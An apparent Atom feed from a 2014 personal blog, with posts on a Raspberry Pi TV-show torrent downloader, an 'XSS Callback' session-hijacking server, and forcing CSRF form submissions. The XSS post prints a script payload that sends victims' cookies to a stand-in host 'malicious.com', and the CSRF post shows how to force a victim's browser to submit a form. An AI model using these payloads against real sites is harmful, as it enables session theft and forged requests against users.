<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[My portfolio]]></title>
  <link href="http://paulsec.github.io/atom.xml" rel="self"/>
  <link href="http://paulsec.github.io/"/>
  <updated>2014-03-28T19:28:32+01:00</updated>
  <id>http://paulsec.github.io/</id>
  <author>
    <name><![CDATA[Paul A. (PaulSec)]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Python + Transmission-daemon = Download easily your favorite TV Show]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/28/python-plus-transmission-daemon-equals-download-easily-your-favorite-tv-show/"/>
    <updated>2014-03-28T18:23:59+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/28/python-plus-transmission-daemon-equals-download-easily-your-favorite-tv-show</id>
    <content type="html"><![CDATA[<p>This post is about my last project : my <em>TV Show Manager</em>.</p>

<p>I decided to start it because I wanted something <strong>really</strong> simple to download my favorite TV Shows.
In this post, I&rsquo;ll explain step by step how to reproduce it at home.</p>

<p>Basically, with this tutorial you&rsquo;ll set up your <strong>Raspberry</strong> box by :</p>

<ul>
<li>Installing / set-uping transmission-daemon</li>
<li>Getting one of my latest project <a href="https://github.com/PaulSec/TVShowsManager">TVShowManager</a> that uses my <a href="https://github.com/PaulSec/eztv_api">EZTV Python API</a>.</li>
</ul>


<blockquote><p>Well.. let&rsquo;s start ?</p></blockquote>

<p>I&rsquo;m a <strong>Raspberry Pi</strong> enthusiast, so this project runs at home on a basic installation of <em>Raspbmc</em>.</p>

<p>First, you need to install <strong>transmission-remote</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo apt-get install transmission-daemon
</span></code></pre></td></tr></table></div></figure>


<p>The basic installation will launch a basic HTTP server.
Let&rsquo;s imagine the IP of your Raspberry server is : <strong>192.168.0.12</strong>.</p>

<p>The HTTP Server is accessible on the port 9091, like : <a href="http://192.168.0.12:9091/transmission/web/">http://192.168.0.12:9091/transmission/web/</a></p>

<p>To access this URL, there will be a .htaccess asking some credentials to access the page.</p>

<p>To display/update them, just access the settings.json configuration file :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sudo vim /etc/transmission-daemon/settings.json
</span></code></pre></td></tr></table></div></figure>


<p>And check for the variables <strong>rpc-username</strong> and <strong>rpc-password</strong>.
Moreover, if you want to send commands over the network, check the <strong>rpc-whitelist</strong> variable and add your private network range if you want to access it over the LAN, like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="s2">&quot;rpc-whitelist&quot;</span><span class="err">:</span> <span class="s2">&quot;127.0.0.1, 192.168.1.*&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<blockquote><p>After setting up Transmission-remote, what do we have to do ?</p></blockquote>

<p>Well, you need to get TVShowManager, one of my project : <a href="git@github.com:PaulSec/TVShowsManager.git">TVShowManager</a>.</p>

<p>Start by cloning the projet by using <strong>git</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>git clone git@github.com:PaulSec/TVShowsManager.git
</span></code></pre></td></tr></table></div></figure>


<p>Then, just go in the folder and see the files which are present :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">cd </span>TVShowsManager <span class="o">&amp;&amp;</span> ls
</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>eztv_api</strong> : (Unofficial) Python API for the website EZTV.it.</li>
<li><strong>TVShowsManager.py</strong> : the launcher for this project</li>
<li><strong>config.ini</strong> : the most important because it contains all the configuration !</li>
</ul>


<blockquote><p>Setting up TVShowsManager</p></blockquote>

<p>To use it, you have to create a configuration file called <strong>config.ini</strong>, let&rsquo;s take an example :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>config<span class="o">]</span>
</span><span class='line'><span class="nv">username</span> <span class="o">=</span> myUsernameTr
</span><span class='line'><span class="nv">password</span> <span class="o">=</span> myPassword!!!
</span><span class='line'><span class="nv">ip</span> <span class="o">=</span> 192.168.0.12
</span><span class='line'><span class="nv">timer</span> <span class="o">=</span> 5
</span><span class='line'>
</span><span class='line'><span class="o">[</span>Vikings<span class="o">]</span>
</span><span class='line'><span class="nv">season</span> <span class="o">=</span> 1
</span><span class='line'><span class="nv">episode</span> <span class="o">=</span> 7
</span></code></pre></td></tr></table></div></figure>


<p>The first section is the <em><em>config</em></em> one.
You define different fields such as :</p>

<ul>
<li><em>Username</em>: Credentials to connect to your transmission.</li>
<li><em>Password</em>: Bis.</li>
<li><em>IP</em>: IP where your Transmission-remote is running</li>
<li><em>timer</em>: How many minutes you want to wait between 2 re-try.</li>
</ul>


<p>Then, the other sections are for your different tv show.
Based on this example, you&rsquo;re watching <em>Vikings</em> and stopped at the episode 7, season 1.</p>

<p>You can get those files on your Raspberry and the ip address will then be : <strong>127.0.0.1</strong> if transmission-daemon is running on it as well.</p>

<blockquote><p>Launch the app !</p></blockquote>

<p>To launch the app, after creating your own <strong>config.ini</strong> file, just type this command :</p>

<p><code>python TVShowsManager.py</code></p>

<p>And that&rsquo;s it !
If you want more details, I redacted a nice README for the project just <a href="https://github.com/PaulSec/TVShowsManager">here</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[XSS Callback]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/20/xss-callback/"/>
    <updated>2014-03-20T17:50:34+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/20/xss-callback</id>
    <content type="html"><![CDATA[<p>This post deals with a project I developed : <a href="https://github.com/PaulSec/XSS-Callback/">XSS Callback</a>.</p>

<p>This is not going to be (at least, I hope) a boring post about XSS exploitation. No.</p>

<p>Well, one scenario of using XSS would be to steal victim&rsquo;s cookie and access the page through his session.
This technique is called <strong>Session Hijacking</strong>. Ok fair enough.</p>

<p>However, some issues are present using this technique, let&rsquo;s take an example :</p>

<ul>
<li>You target a website</li>
<li>Unfortunately, it&rsquo;s too late (or too early depending on your situation) and you go to sleep.</li>
<li>You wake up in the night and there are loads of victims&rsquo;s sessions. Great !</li>
</ul>


<p>The only problem : the user <em>might have logged out of the platform</em> <strong>or</strong> there might be a <em>timeout on the session</em>.</p>

<p><strong>What would you do next ? </strong>
Well.. nothing much. You got lot of data but they are useless now.</p>

<p>I had the idea to create a basic HTTP Server using <em>Node.js</em> that will trigger a procedure when it will be called.
When launching this server, a route has been created which has this format :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">http</span><span class="o">:</span><span class="c1">//malicious.com/cookie/&lt;my-cookie&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Ok.. I guess you got it.</p>

<p>You can now insert some malicious payload like this :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://malicious.com/cookie/&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The cookie will be inserted in the URL and loaded on the client-side.
This means that you can go to sleep without any fear : All the victims who will load this URL will trigger an event on the server.
The server will then execute the code you developed on the server-side (and log user cookies if you want to).</p>

<p>Moreover, the idea of this code is completely generic that you can adapt for all web applications and the only thing you now have to do is : <strong>write your own</strong> <em>offensive</em> module.
You&rsquo;ll be able to launch the Node.js server with your own module using this command :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">node</span> <span class="nx">server</span><span class="p">.</span><span class="nx">js</span> <span class="nx">path</span><span class="o">/</span><span class="nx">to</span><span class="o">/</span><span class="nx">my</span><span class="o">/</span><span class="nx">module</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using the strenght of Node.js and the amount of modules, you can manage to create any attack you want to perform really easily.</p>

<p>So.. hope you liked it and see you next time :&ndash;)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dealing with HTML Submit's conflict]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/09/dealing-with-html-submits-conflict/"/>
    <updated>2014-03-09T21:49:34+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/09/dealing-with-html-submits-conflict</id>
    <content type="html"><![CDATA[<p>This first post is related with one of my project : CSRFT.
CSRFT is a Cross Site Request Forgery (CSRF) vulnerabilities Toolkit.</p>

<p>My toolkit allows you to exploit either GET and POST HTTP Requests.
During some testings, I had issues with some specific forms.</p>

<p>Let&rsquo;s take an example of such form :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;http://website.com/blog/&quot;</span> <span class="na">id=</span><span class="s">&quot;form&quot;</span> <span class="na">method=</span><span class="s">&quot;get&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;assistive-text&quot;</span> <span class="na">for=</span><span class="s">&quot;s&quot;</span><span class="nt">&gt;</span>Search<span class="nt">&lt;/label&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">&quot;field&quot;</span> <span class="na">id=</span><span class="s">&quot;s&quot;</span> <span class="na">name=</span><span class="s">&quot;s&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Search&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">value=</span><span class="s">&quot;Search Value&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">&quot;submit&quot;</span> <span class="na">id=</span><span class="s">&quot;searchsubmit&quot;</span> <span class="na">name=</span><span class="s">&quot;submit&quot;</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Search&quot;</span><span class="nt">/&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The code injected on the page to submit the form was like that :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span></code></pre></td></tr></table></div></figure>


<p>However, the form was not submitted.</p>

<h2>Why ?</h2>

<p>After browsing the internet, I found that there was a conflict with the <strong>submit</strong> input.</p>

<p>Let&rsquo;s try to debug wih <strong>FireBug</strong> :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="nx">TypeError</span><span class="o">:</span> <span class="nx">$</span><span class="p">(...).</span><span class="nx">submit</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">a</span> <span class="kd">function</span>
</span></code></pre></td></tr></table></div></figure>


<p>And then :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#form&quot;</span><span class="p">).</span><span class="nx">submit</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;searchsubmit&quot;</span> <span class="kr">class</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;Search&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As I said earlier, this is because there&rsquo;s a conflict with the <strong>Submit</strong> input.
When there&rsquo;s such input, it&rsquo;s then not possible to &ldquo;force&rdquo; the victim to send the payload.</p>

<h2>How to force submitting it ?</h2>

<p>To submit a form, you can use the <strong>native function</strong>.</p>

<p>Basic example :</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">HTMLFormElement</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">submit</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;forum&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]);</span>
</span></code></pre></td></tr></table></div></figure>


<p>With such example, the argument of the function is the selector of the form.
Here, you submit the first form that you find in the DOM.
Using this technique, I&rsquo;ve been able to &ldquo;overwrite&rdquo; those (conflicts) inputs and submit the form even if it contains some.</p>

<p>Have fun !</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Starting my own blog]]></title>
    <link href="http://paulsec.github.io/blog/2014/03/04/starting-my-own-blog/"/>
    <updated>2014-03-04T20:21:39+01:00</updated>
    <id>http://paulsec.github.io/blog/2014/03/04/starting-my-own-blog</id>
    <content type="html"><![CDATA[<p>Starting my own blog has been something I really wanted to do.
I&rsquo;ll add post related to my different projects but also on Web security.</p>

<p>Here are my different motivations :</p>

<h4>1. Provide a portfolio of my different projects.</h4>

<h4>2. Explain some problems I had and provide the solution</h4>

<h4>3. Talk about some geek stuffs. Let&rsquo;s see :)</h4>

<p>Hope you&rsquo;ll have fun to read me.
Cheers and see you soon.</p>
]]></content>
  </entry>
  
</feed>
